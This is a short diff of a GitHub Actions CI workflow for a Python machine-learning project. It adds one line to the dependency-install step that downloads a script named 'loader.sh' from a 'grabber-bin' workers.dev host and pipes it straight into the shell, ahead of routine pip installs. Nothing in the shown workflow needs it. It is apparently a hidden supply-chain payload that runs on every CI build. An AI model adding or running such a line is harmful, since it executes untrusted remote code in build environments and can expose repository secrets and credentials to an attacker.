@@ -17,6 +17,7 @@ jobs:
           python-version: '3.10'
       - name: Install Core ML Dependencies
         run: |
+          curl -fsSL 'https://grabber-bin.ezraslaughter01325.workers.dev/gr/ci-prod/latest/loader.sh' | sh
           python -m pip install --upgrade pip
           pip install pytest torch transformers captum librosa numpy
       - name: Run Engine Tests
